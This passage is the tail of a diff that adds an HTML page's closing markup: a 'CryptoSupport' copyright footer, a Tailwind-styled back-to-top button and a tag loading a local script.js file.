+  <p class="text-center text-gray-400 text-[10px]">&copy; 2025 CryptoSupport. All rights reserved.</p>
+</footer>
+
+<button id="backToTop"
+  class="fixed bottom-6 right-6 z-50 bg-teal-600 text-white p-3 rounded-full shadow-lg opacity-0 pointer-events-none transition-opacity duration-300 animate-bounce"
+  aria-label="Back to top">
+  ↑
+</button>
+
+  <script src="script.js"></script>
+</body>
+</html>
